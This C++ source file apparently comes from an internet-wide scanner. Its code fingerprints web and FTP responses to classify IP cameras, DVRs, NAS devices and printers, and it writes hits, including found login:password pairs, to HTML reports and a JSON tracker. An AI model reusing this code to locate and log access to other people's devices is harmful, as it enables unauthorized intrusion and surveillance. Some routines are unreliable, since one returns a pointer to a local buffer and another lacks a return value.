#include "STh.h"
#include "mainResources.h"	
#include "externFunctions.h"
#include "externData.h"
#include "WebformWorker.h"
#include "Connector.h"
#include "BasicAuth.h"
#include "FTPAuth.h"
#include "SSHAuth.h"
#include <memory>
#include "FileUpdater.h"

char* strstri(const char *_Str, const char *_SubStr)
{
	if(_Str != NULL)
	{
        const std::string &_lowStr = toLowerStr(_Str);
        const std::string &_lowSubStr = toLowerStr(_SubStr);
		const char *resChar = strstr(_lowStr.c_str(), _lowSubStr.c_str());
        if(resChar == 0) return NULL;
        else {
            return (char*)(_Str + (resChar - _lowStr.c_str()));
        }
	};
    return 0;
}

bool gGlobalTrackLocked = false;
char *_findFirst(const char *str, char *delim)
{
	int sz = strlen(str);
	int dsz = strlen(delim);
	for(int i = 0; i < sz; ++i)
	{
		for(int j = 0; j < dsz; ++j)
		{
			if(str[i] == delim[j]) return (char *)(str + i);
		};
	};

	return NULL;
}

char *_findLast(char *str, char *delim)
{
	int sz = strlen(str);
	int dsz = strlen(delim);
	int savedPosition = 0;
	for(int i = 0; i < sz; ++i)
	{
		for(int j = 0; j < dsz; ++j)
		{
			if(str[i] == delim[j]) savedPosition = i;
		};
	};

	return (char *)(str + savedPosition);
}

char *GetCodePage(const char *str)
{
	char cdpg[32] = {0};
    char *ptr1 = strstri(str, "<meta ");

    if(ptr1 != NULL)
    {
        char *ptr2 = strstri(ptr1 + 6, "charset=");
        if(ptr2 != NULL)
        {
            char *temp4 = _findFirst((char *)(ptr2 + 6), " \"'>\n\r");
			if(temp4 != NULL)
			{
                int ln = (int)(temp4 - ptr2 - 8);
				if(ln > 16) 
				{
					return "WTF?";
				};
                strncpy(cdpg, (char *)(ptr2 + 8), (ln > 32) ? 32 : ln );
				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
				return cdpg;
			}
			else
			{
                stt->doEmitionRedFoundData("[GetCodePage] [" + QString(ptr2).mid(0, 16) + "]");
                return "NULL";
			};
        }

        ptr2 = strstri(ptr1 + 6, "charset = ");
        if(ptr2 != NULL)
        {
            char *temp4 = _findFirst((char *)(ptr2 + 10), " \"'>\n\r");
			if(temp4 != NULL)
			{
                int ln = (int)(temp4 - ptr2 - 10);
				if(ln > 16) 
				{
					return "WTF?";
				};
                strncpy(cdpg, (char *)(ptr2 + 10), (ln > 32) ? 32 : ln );
				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
				return cdpg;
			}
			else
			{
                stt->doEmitionRedFoundData("[GetCodePage] [" + QString(ptr2).mid(0, 16) + "]");
                return "NULL";
			};
        }

        ptr2 = strstri(ptr1 + 6, "charset =");
        if(ptr2 != NULL)
        {
            char *temp4 = _findFirst((char *)(ptr2 + 9), " \"'>\n\r");
			if(temp4 != NULL)
			{
                int ln = (int)(temp4 - ptr2 - 9);
				if(ln > 16) 
				{
					return "WTF?";
				};
                strncpy(cdpg, (char *)(ptr2 + 9), (ln > 32) ? 32 : ln );
				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
				return cdpg;
			}
			else
			{
                stt->doEmitionRedFoundData("[GetCodePage] [" + QString(ptr2).mid(0, 16) + "]");
                return "NULL";
			};
		}
		else
		{
			if(strstri(str, "charset=") != NULL)
			{
				char *temp2 = strstri(str, "charset=");
                char *temp3 = _findFirst((char *)(temp2 + 8), " \"'>\n\r");
				if(temp3 != NULL)
				{
                    int ln = (int)(temp3 - temp2 - 8);
					if(ln > 16) 
					{
						return "WTF?";
					};
                    strncpy(cdpg, (char *)(temp2 + 8), (ln > 32) ? 32 : ln );
					if(strstri(cdpg, "%s") != NULL) return "UTF-8";
					return cdpg;
				}
				else
				{
					stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
                    return "NULL";
				}
			}
			else
			{
				return "NULL";
			};
		};	
	}

    ptr1 = strstri(str, "charset=");
    if(ptr1 != NULL)
    {
        char *temp3 = _findFirst((char *)(ptr1 + 8), " \"'\n\r");
		if(temp3 != NULL)
		{
            int ln = (int)(temp3 - ptr1 - 8);
			if(ln > 16) 
			{
				return "WTF?";
			};
            strncpy(cdpg, (char *)(ptr1 + 8), (ln > 32) ? 32 : ln );
			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
			return cdpg;
		}
		else
		{
			stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
            return "NULL";
		};
	}
	else
	{
		return "NULL";
	};
}

int globalSearchNeg(const char *buffcpy, const char *ip, int port)
{
	char negWord[256] = {0};
    for(int i = 0; i < GlobalNegativeSize; ++i)
	{

        FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
        if(!globalScanFlag) return -1;

			strcpy(negWord, GlobalNegatives[i]);
			if(strstr(buffcpy, negWord) != NULL) 
			{
				if(gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "]\tNegative hit: \"" + QString::fromLocal8Bit(negWord).toHtmlEscaped() + "\"");
					if(strlen(negWord) < 2) 
					{
						stt->doEmitionDebugFoundData("		Len:" + QString::number(strlen(negWord)));
					};
					if(strcmp(negWord, "") == 0) 
					{
						stt->doEmitionDebugFoundData("Empty hit!");
					};
					if(strcmp(negWord, " ") == 0) 
					{
						stt->doEmitionDebugFoundData("Space hit!");
					};
				};

				++Filt;
				return -1;
			};

		ZeroMemory(negWord, 256);
	};
}

int globalSearchPrnt(const char *buffcpy)
{
	if(strstr(buffcpy, "en/_top.htm") != NULL || strstr(buffcpy, "cannon http server") != NULL
		|| strstr(buffcpy, "konica minolta") != NULL || strstr(buffcpy, "/eng/home_frm.htm") != NULL
		|| strstr(buffcpy, "networkScanner webserver") != NULL || strstr(buffcpy, "/eng/htm/top.htm") != NULL
		|| strstr(buffcpy, "pages/t_ixdmy.htm") != NULL
		|| strstr(buffcpy, "/web/guest/") != NULL || strstr(buffcpy, "printerInfo") != NULL
		|| strstr(buffcpy, "hp photosmart") != NULL
		|| strstr(buffcpy, "menu and") != NULL
		|| strstr(buffcpy, "hewlett packard") != NULL
		|| strstr(buffcpy, "laserjet") != NULL || strstr(buffcpy, "supplies summary") != NULL
		|| strstr(buffcpy, "seiko epson") != NULL || strstr(buffcpy, "ink_y.png") != NULL
		|| strstr(buffcpy, "epsonnet") != NULL || strstr(buffcpy, "printer name") != NULL
		) 
		{
			if(gNegDebugMode)
			{
				stt->doEmitionDebugFoundData("Printer detected.");		
			};

			return -1;
	};

    return 0;
}

int sharedDetector(const char * ip, int port, const char *buffcpy) {

    if(strstr(buffcpy, "401 authorization") != NULL || strstr(buffcpy, "401 unauthorized") != NULL
        || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, "401 ") != NULL )
        || strstr(buffcpy, "401 unauthorized access denied") != NULL
        || strstr(buffcpy, "401 unauthorised") != NULL || (strstr(buffcpy, "www-authenticate") != NULL
        && strstr(buffcpy, " 401\r\n") != NULL)
        ) {
            if(strstr(buffcpy, "digest realm") != NULL && strstr(buffcpy, "basic realm") == NULL) {
                                                                                                                                                    return 101;
            } else                                                                                                                                  return 1;
    };
    if(strstr(buffcpy, "netwave ip camera"))																										return 11;
    if(strstr(buffcpy, "live view / - axis"))																										return 12;
    if(strstr(buffcpy, "vilar ipcamera"))																											return 13;
    if(strstr(buffcpy, "window.location = \"rdr.cgi\""))																							return 14;
    if(strstr(buffcpy, "httpfileserver"))																											return 15;
    if(strstr(buffcpy, "real-time ip camera monitoring system") != NULL
            || strstr(buffcpy, "server push mode") != NULL
        )																																			return 17; //Real-time IP Camera Monitoring System
    if(strstr(buffcpy, "linksys.com") != NULL && strstr(buffcpy, "tm05") != NULL)																	return 18; //linksys.com cameras
    if(strstr(buffcpy, "reecam ip camera") != NULL)																									return 19; //reecam cameras
    if(strstr(buffcpy, "/view/viewer_index.shtml") != NULL)																							return 20; //axis cameras
    if(strstr(buffcpy, "bridge eyeon") != NULL)																										return 21; //Bridge Eyeon
    if(strstr(buffcpy, "ip camera control webpage") != NULL && strstr(buffcpy, "/main/cs_motion.asp") != NULL)										return 22; //ip camera control
    if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/live/index2.html") != NULL)													return 23; //network camera BB-SC384
    if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/en/live.html") != NULL)											return 24; //Network Camera VB-M40
    if(strstr(buffcpy, "panasonic ") != NULL && strstr(buffcpy, ":60002/snapshotjpeg") != NULL)														return 25; //Panasonic wtfidonteven-camera
    if(strstr(buffcpy, "sony network camera") != NULL && strstr(buffcpy, "/command/inquiry.cgi?") != NULL)											return 26; //Sony Network Camera
    if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "src=\"webs.cgi?") != NULL)														return 27; //UA Network Camera
    if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/index.html") != NULL)												return 28; //Network Camera VB-M40
    if(strstr(buffcpy, "lg smart ip device") != NULL)																								return 29; //LG Smart IP Device Camera
    if(strstr(buffcpy, "/view/viewer_index.shtml") != NULL)																							return 20; //axis cameras
    if(strstr(buffcpy, "nas") != NULL && strstr(buffcpy, "/cgi-bin/data/viostor-220/viostor/viostor.cgi") != NULL)									return 30; //NAX
    if(strstr(buffcpy, "ip camera") != NULL && strstr(buffcpy, "check_user.cgi") != NULL)															return 31; //axis cameras
    if(strstr(buffcpy, "ws(\"user\");") != NULL && strstr(buffcpy, "src=\"/tool.js") != NULL
            && strstr(buffcpy, "<b class=\"xb1\"></b>") != NULL)                                                                                    return 32; //web ip cam
    if(strstr(buffcpy, "geovision") != NULL
            && (strstr(buffcpy, "ip camera") != NULL
                || strstr(buffcpy, "ssi.cgi/login.htm") != NULL))                                                                                   return 33; //GEO web ip cam

    if(strstr(buffcpy, "hikvision-webs") != NULL
        || (strstr(buffcpy, "hikvision digital") != NULL && strstr(buffcpy, "dvrdvs-webs") != NULL)
        || (strstr(buffcpy, "lapassword") != NULL && strstr(buffcpy, "lausername") != NULL && strstr(buffcpy, "dologin()") != NULL))				return 34; //hikvision cam
    if((strstr(buffcpy, "easy cam") != NULL && strstr(buffcpy, "easy life") != NULL)
        || (strstr(buffcpy, "ipcamera") != NULL && strstr(buffcpy, "/tool.js") != NULL))															return 35; //EasyCam
    if(strstr(buffcpy, "/config/cam_portal.cgi") != NULL || strstr(buffcpy, "/config/easy_index.cgi") != NULL)										return 36; //Panasonic Cam
    if(strstr(buffcpy, "panasonic") != NULL && strstr(buffcpy, "/view/getuid.cgi") != NULL)															return 37; //Panasonic Cam WJ-HD180
    if(strstr(buffcpy, "ipcam client") != NULL && strstr(buffcpy, "plugins.xpi") != NULL && strstr(buffcpy, "js/upfile.js") != NULL)				return 38; //Foscam
    if(strstr(buffcpy, "ip surveillance") != NULL && strstr(buffcpy, "customer login") != NULL)														return 39; //EagleEye
    if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/admin/index.shtml?") != NULL)													return 40; //Network Camera VB-C300
    if(strstr(buffcpy, "sq-webcam") != NULL && strstr(buffcpy, "liveview.html") != NULL)															return 41; //AVIOSYS-camera
    if(strstr(buffcpy, "nw_camera") != NULL && strstr(buffcpy, "/cgi-bin/getuid") != NULL)															return 42; //NW_camera
    if(strstr(buffcpy, "micros") != NULL && strstr(buffcpy, "/gui/gui_outer_frame.shtml") != NULL)													return 43; //NW_camera
    if(strstr(buffcpy, "lapassword") != NULL
        && strstr(buffcpy, "lausername") != NULL
        && strstr(buffcpy, "g_ologin.dologin()") != NULL
        )																																			return 44; //hikvision cam 2
    if(strstr(buffcpy, "panasonic") != NULL && strstr(buffcpy, "/config/index.cgi") != NULL)														return 45; //Panasonic Cam BB-HG???
    if(strstr(buffcpy, "/ui/") != NULL && strstr(buffcpy, "sencha-touch") != NULL)																	return 46; //BUFFALO disk
    if(strstr(buffcpy, "digital video server") != NULL && strstr(buffcpy, "gui.css") != NULL)														return 47; //Digital Video Server
        if(strstr(buffcpy, "/ipcamerasetup.zip") != NULL && strstr(buffcpy, "download player") != NULL
        && strstr(buffcpy, "ipcam") != NULL)																										return 48; //ipCam
    if(strstr(buffcpy, "dvr") != NULL && strstr(buffcpy, "ieorforefox") != NULL
        && strstr(buffcpy, "sofari") != NULL)                                                                                                       return 49; //IEORFOREFOX
    if (strstr(buffcpy, "seyeon") != NULL && (strstr(buffcpy, "/app/multi/single.asp") != NULL
        || strstr(buffcpy, "/app/live/sim/single.asp") != NULL))																					return 50; //Network Video System

    if(((strstr(buffcpy, "220") != NULL) && (port == 21)) ||
        (strstr(buffcpy, "220 diskStation ftp server ready") != NULL) ||
        (strstr(buffcpy, "220 ftp server ready") != NULL)
        || strstr(buffcpy, "500 'get': command not understood") != NULL
        )                                                                                                                                           return 16; // 16 - FTP

    if((strstr(buffcpy, "camera web server") != NULL	|| strstr(buffcpy, "webcamxp 5") != NULL
        || strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
        || strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
		|| strstr(buffcpy, "network camera") != NULL	|| strstr(buffcpy, "index of") != NULL
        || strstr(buffcpy, "$lock extended") != NULL	|| strstr(buffcpy, "ip camera") != NULL
        || strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
        || strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
        || strstr(buffcpy, "ipcam") != NULL)
        && strstr(buffcpy, "customer") == NULL
        && strstr(buffcpy, "purchase") == NULL
        && strstr(buffcpy, "contac") == NULL
        && strstr(buffcpy, "company") == NULL
        )																																			return 0;

    if(globalSearchNeg(buffcpy, ip, port) == -1)                                                                                                    return -1;
    if(globalSearchPrnt(buffcpy) == -1)																					                            return -1;
    //if(strstr(buffcpy, "<form ") != NULL && strstr(buffcpy, "302 found") == NULL)                                                                   return 10;
	//nic.sucks, etc

    return -2;
}

// 500 < 1600
int _mainFinderFirst(const char *buffcpy, int f, int port, const char *ip)
{
    int flag = sharedDetector(ip, port, buffcpy);
    if(flag != -2) return flag;

    if(f) return 7;

	return 0;
}

//> 1600
int _mainFinderSecond(const char *buffcpy, int port, const char *ip)
{
    int flag = sharedDetector(ip, port, buffcpy);
    if(flag != -2) return flag;

	return 3; //Suspicious
}

int ContentFilter(const char *buff, int port, const char *ip, char *cp)
{
    if(buff != NULL)
	{
		int res = 0;
		std::string tempString = "";

		if(strstr(cp, "1251") != NULL)
		{
			tempString = toLowerStr(buff);
		}
		else
		{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
            tempString = toLowerStr(xcode(buff, CP_UTF8, CP_ACP).c_str());
#else
            tempString = toLowerStr(buff);
#endif
		};
		
		int sz = tempString.size();
		char *lBuff = new char[sz + 1];
		ZeroMemory(lBuff, sz + 1);
		strcpy(lBuff, tempString.c_str());
		memset(lBuff + sz, '\0', 1);

		if(sz <= 500)
		{
            res = _mainFinderFirst(lBuff, 1, port, ip);
		}
		else if((sz > 500 && sz <= 3500) || sz > 180000) 
		{	
            res = _mainFinderFirst(lBuff, 0, port, ip);
		}
		else if(sz > 3500 && sz <= 180000)
		{
            res = _mainFinderSecond(lBuff, port, ip);
		};

		delete []lBuff;
		return res;
	}
	else return -1;
}

void fillGlobalLogData(const char *ip, char *hostname, char *port, const char *sz, char *title,
                       const char *login, const char *pass, char *comment, char *cdpg, char *clss)
{
	if(trackerOK == true)
	{
		while(gGlobalTrackLocked == true) Sleep(10);
		gGlobalTrackLocked = true;
		
		QJsonObject jsonData; 

			if(gMode == 0 || gMode == -1)
			{
				if(strlen(ip) > 0) jsonData.insert("ip_addr", QJsonValue(QString(ip)) );
				else jsonData.insert("ip_addr", QJsonValue(QString("")) );

				jsonData.insert("hostname", QJsonValue(QString(hostname)) );
			}
			else
			{
				jsonData.insert("ip_addr", QJsonValue(QString("")) );
				jsonData.insert("hostname", QJsonValue(QString(ip)) );
			};

			jsonData.insert("port", QJsonValue(QString(port).replace(":", "")) );
			jsonData.insert("recv", QJsonValue(QString(sz)) );
			QString tt = QString(base64_encode((const unsigned char *)title, strlen(title)).c_str());
			if(strlen(title) == 0) jsonData.insert("title", QJsonValue(QString("NULL")) );
			else jsonData.insert("title", QJsonValue(QString(base64_encode((const unsigned char *)title, strlen(title)).c_str())) );
			if(strlen(login) > 0) jsonData.insert("login", QJsonValue(QString(login)) );
			else jsonData.insert("login", QJsonValue(QString("")) );
			if(strlen(pass) > 0) jsonData.insert("pass", QJsonValue(QString(pass)) );
			else jsonData.insert("pass", QJsonValue(QString("")) );
			if(strlen(comment) > 0) jsonData.insert("other", QJsonValue(QString(comment)) );
			else jsonData.insert("other", QJsonValue(QString("")) );
			if(strlen(cdpg) > 0) jsonData.insert("encoding", QJsonValue(QString(cdpg)) );
			else jsonData.insert("encoding", QJsonValue(QString("")) );
			if(strlen(clss) > 0) jsonData.insert("Class", QJsonValue(QString(clss)) );
			else jsonData.insert("Class", QJsonValue(QString("")) );

		while(jsonArr == NULL);
		jsonArr->push_front(jsonData);

		gGlobalTrackLocked = false;
	};
}

int __checkFileExistence(int flag)
{
	char fileName[64] = {0};

    if(flag == 666 || flag == 350) strcpy(fileName, RESULT_DIR_NAME"/STRANGE_ERROR.html");
    else if(flag == -22) strcpy(fileName, RESULT_DIR_NAME"/ssh.html");
    else if(flag == 0 || flag == 15 || flag == -10) strcpy(fileName, RESULT_DIR_NAME"/strange.html");
    else if(flag == 3) strcpy(fileName, RESULT_DIR_NAME"/other.html");
    else if(flag == 7) strcpy(fileName, RESULT_DIR_NAME"/low_loads.html");
    else if(flag == 10) strcpy(fileName, RESULT_DIR_NAME"/LoginForms.html");
    else if(flag == 16) strcpy(fileName, RESULT_DIR_NAME"/FTP.html");
	else if(flag >= 17 || flag == 11 || flag == 12 
        || flag == 13 || flag == 14 || flag == 1) strcpy(fileName, RESULT_DIR_NAME"/Basicauth.html");

	FILE *f = fopen(fileName, "r");
	if(f == NULL) return true;
	else 
	{
		fclose(f);
		return false;
	};
}

bool ftsAnom = true;
bool ftsOther = true;
bool ftsSSH = true;
bool ftsLL = true;
bool ftsFTP = true;
bool ftsBA = true;
bool ftsLF = true;

bool fOpened = false;
char styleBuff[1024] = {"<style> #recvSpan{display: inline-block;width: 150px;} #hostSpan{display: inline-block;width: 200px;}body { background-color: #141414; font-family: monospace; font-size:95%;} #ipd{background:black;width:100%;white-space:nowrap;overflow-x:none;display:inline-block;}#ipd:hover{color: #909090;background:#202020;}#tit{text-align:center;border:1px solid #5d5d5d;}a{color: gray;text-decoration: underline;} a:focus{ outline-style: dashed;outline-width:1px; outline-color: red;}</style>"};
char topBuff[1024] = {"<div id=\"tit\"><a href=\"strange.html\">.strange</a> <a href=\"other.html\">.other</a> <a href=\"Basicauth.html\">.BasicAuth</a> <a href=\"FTP.html\">.FTP</a>  <a href=\"low_loads.html\">.LowLoads</a> <a href=\"LoginForms.html\">.loginforms</a> <a href=\"SSH.html\">.SSH</a></div><br><br>"};
void fputsf(char *text, int flag, char *msg)
{
    FILE *file = NULL;

	if(flag == 0 || flag == 15 || flag == -10) 
	{
		if(ftsAnom) ftsAnom				= __checkFileExistence(flag);
		file = fopen(RESULT_DIR_NAME"/strange.html", "a");
	}
	else if(flag == 3) 
	{
		if(ftsOther) ftsOther			= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/other.html", "a");
	}
	else if(flag == -22) 
	{
		if(ftsSSH) ftsSSH				= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/SSH.html", "a");
	}
	else if(flag == 7) 
	{
		if(ftsLL) ftsLL					= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/low_loads.html", "a");
	}
	else if(flag == 10) 
	{
		if(ftsLF) ftsLF					= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/LoginForms.html", "a");
	}
	else if(flag == 16) 
	{
		if(ftsFTP) ftsFTP				= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/FTP.html", "a");
	}
	else if(flag >= 17 || flag == 11 || flag == 12 
		|| flag == 13 || flag == 14 || flag == 1
		) 
	{
		if(ftsBA) ftsBA					= __checkFileExistence(flag);
        file = fopen(RESULT_DIR_NAME"/Basicauth.html", "a");
	}
	else
	{
		stt->doEmitionRedFoundData("[WUT!?] Unknown flag [FLAG: " + QString::number(flag) + "]");	
	};

	if(file != NULL)
	{
		time_t rtime;
		time(&rtime);
		if(horLineFlag == false) 
		{
			horLineFlag = true;
			char delimiter[128] = {0};
			char cdate[32] = {0};
			strcpy (cdate, "[");
			strcat (cdate, ctime (&rtime));
			memset (cdate + strlen(cdate) - 1, '\0', 1);
			strcat (cdate, "] ");
			strcpy(delimiter, "<hr><center><h5><font color=\"#a1a1a1\">");
			strcat(delimiter, cdate);
			strcat(delimiter, "</font></h5></center><hr>");
			fputs (delimiter, file);
		};
		++saved;
		char *string = new char[strlen(text) + 512];
		if(flag != -22) 
		{
			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;text-decoration: none;\">");
			
			char cdate[32] = {0};
			strcat (cdate, "[");
			strcat (cdate, ctime (&rtime));
			memset (cdate + strlen(cdate) - 1, '\0', 1);
			strcat (cdate, "] ");
			strcat (string, cdate);
			strcat (string, text);
			strcat (string, "</div>");
		}
		else
		{
			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;\">");
			
			char cdate[32] = {0};
			strcat (cdate, "[");
			strcat (cdate, ctime (&rtime));
			memset (cdate + strlen(cdate) - 1, '\0', 1);
			strcat (cdate, "] ");
			strcat (string, cdate);
			strcat (string, text);
			strcat (string, "</div>");
		};

		if(flag == 0 && ftsAnom)
		{
			char tmsg[1024] = {0};
			ftsAnom = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Anomalies</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs ("<div id=\"tit\"><a href=\"strange.html\">.strange</a> <a href=\"other.html\">.other</a> <a href=\"Basicauth.html\">.BasicAuth</a> <a href=\"FTP.html\">.FTP</a>  <a href=\"low_loads.html\">.LowLoads</a> <a href=\"LoginForms.html\">.loginforms</a> <a href=\"SSH.html\">.SSH</a></div><br><br>", file);		
		};
		if(flag == 3 && ftsOther)	
		{
			char tmsg[1024] = {0};
			ftsOther = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Suspicious</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);		
		};
		if(flag == -22 && ftsSSH)	
		{
			char tmsg[1024] = {0};
			ftsOther = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>SSH</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);		
		};
		if(flag == 7 && ftsLL)
		{
			char tmsg[1024] = {0};
			ftsLL = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Lowloads</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
		if(flag == 16 && ftsFTP)
		{
			char tmsg[1024] = {0};
			ftsFTP = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>FTP</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
		if(flag == 10 && ftsLF)
		{
			char tmsg[1024] = {0};
			ftsLF = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>LoginsForms</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		
		};
		if((flag >= 17 || flag == 11 || flag == 12 || flag == 13 || flag == 14 || flag == 1) && ftsBA) 
		{
			char tmsg[1024] = {0};
			ftsBA = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>BasicAuth</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
 
		int innerCounter = 0;
		while(fOpened) 
		{
			if(innerCounter > 20)
			{
				stt->doEmitionRedFoundData("\"fOpened\" loop detected!");
				break;
			};

			++innerCounter;
			Sleep((rand() % 100 + 60));
		};
		fOpened = true;
		fputs (string, file);
		fclose (file);
		fOpened = false;

		delete []string;
	}
	else
	{
		stt->doEmitionRedFoundData("Cannot open file [FLAG: " + QString::number(flag) + "]");
	};
}

void putInFile(int flag, const char *ip, char *port, int recd, char *finalstr, char *hl, char *cp)
{
	char log[4096] = {0}, msg[512] = {0};
		
	QTextCodec *codec;
	sprintf(msg, "<a href=\"http://%s:%s/\"><span style=\"color: #a1a1a1;\">%s:%s</span></a>",
		ip, port, ip, port);

	QString resMes(msg);
	QString strf;
	if(strstri(cp, "shift_jis") != NULL)
	{
		codec = QTextCodec::codecForName("Shift-JIS");
		strf = codec->toUnicode(finalstr);
	}
	else if(strstri(cp, "utf") != NULL)
	{
		codec = QTextCodec::codecForName("UTF-8");
		strf = codec->toUnicode(finalstr);
	}
	else if(strstri(cp, "cp") != NULL || strstri(cp, "windows") != NULL)
	{
		codec = QTextCodec::codecForName("Windows-1251");
		strf = codec->toUnicode(finalstr);
	}
	else strf = QString(finalstr);

	if(flag != 6 && flag != 5 && flag != 4)
	{
		strcat(msg, " <font color=\"#0084ff\">: </font><font color=\"#ff9600\">");
		int sz = strf.size();
		strncat(msg, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), (sz < 128 ? sz : 128));
		strcat(msg, "</font>");
		resMes += " <font color=\"#0084ff\">: </font><font color=\"#ff9600\">" + strf.toHtmlEscaped() + "</font>";
	};

	stt->doEmitionFoundData(resMes);

	sprintf(log, "<span id=\"hostSpan\"><a href=\"http://%s:%s\"/><font color=MediumSeaGreen>%s:%s</font></a>;</span> <span id=\"recvSpan\">Received: <font color=SteelBlue>%d</font>",
		ip, port, ip, port, recd);
	
	if(flag == 666 || flag == 350)	
	{
		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, "", "", "", cp, "Strange error");
		++PieAnomC1;
		++AnomC1;
	}
	else if(flag == 0 || flag == 15 || flag == -10)
	{
		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, "", "", "", cp, "Anomaly");
		++PieAnomC1;
		++AnomC1;
	}
	else if(flag == 3)
	{
		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, "", "", "", cp, "Suspicious");
		++PieSusp;
		++Susp;
	}
	else if(flag == 7)				
	{
		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, "", "", "", cp, "Low load");
		++PieLowl;
	}
	else if(flag == 10)	
	{
		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, "", "", "", cp, "Login form");
		++PieWF;
	};

	if(flag != 6 && flag != 5 && flag != 4)
	{
		strcat(log, ";</span> T: <font color=GoldenRod>");

		strncat(log, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), 100);
		strcat(log, "</font>");
	};
	strcat(log, "\n");

    fputsf (log, flag, msg);

	ZeroMemory(msg, strlen(msg));
}

void _specFillerBA(const char *ip, char *port, char *finalstr, const char *login, const char *pass, int flag)
{
    char log[512] = {0};
	
	++PieBA;
    if(strcmp(login, "NULL") != 0 && strcmp(pass, "NULL") != 0)
    {
        sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"http://%s:%s@%s%s\"><font color=MediumSeaGreen>%s:%s@%s%s</font></a></span> T: <font color=GoldenRod>%s</font>\n",
                login, pass, ip, port, login, pass, ip, port, finalstr);
    } else {
        sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"http://%s%s\"><font color=MediumSeaGreen>%s%s</font></a></span> T: <font color=GoldenRod>%s</font>\n",
                ip, port, ip, port, finalstr);
    }

	stt->doEmitionFoundData(QString::fromLocal8Bit(log));

    fputsf (log , flag, "Basic Authorization");
}

void _specFillerWF(const char *ip, char *port, char *finalstr, char *login, char *pass, int flag)
{
	char log[512] = {0};
	
	++PieWF;

    sprintf(log, "[WF]:<span id=\"hostSpan\"><a href=\"http://%s:%s\"><font color=MediumSeaGreen>%s:%s</font></a></span> T: <font color=GoldenRod>%s</font> Pass: <font color=SteelBlue>%s:%s</font>\n",
            ip, port, ip, port, finalstr, login, pass);

	stt->doEmitionFoundData(QString::fromLocal8Bit(log));

    fputsf (log , flag, "Web Form");
}

void _getFormVal(char *data, char *result, char *key, char *path = NULL)
{
	char parVal[256] = {0};
	int psz = 0;
	char *pkeyResult1 = strstr(data, ">");
	if(pkeyResult1 != NULL)
	{
		psz = pkeyResult1 - data + 1;
		strncpy(parVal, data, (psz < 256 ? psz : 256));
	}
	else
	{
		strncpy(parVal, data, 256);		
	};

	int sz = 0;
	char parVal2[256] = {0};

	char startPath[256] = {0};
	if(strcmp(key, "action") == 0)
	{
		if(strstr(path, "./") == NULL)
		{
			char *ptrP1 = _findLast(path, "/");
			if(ptrP1 != path)
			{
				int pSz = ptrP1 -path;
				strncpy(startPath, path, pSz);
			};
		};
	};

	char *keyResult1 = strstri(parVal, key);

	if(keyResult1 != NULL)
	{
		char *pkeyResult2 = _findFirst(keyResult1, " >");
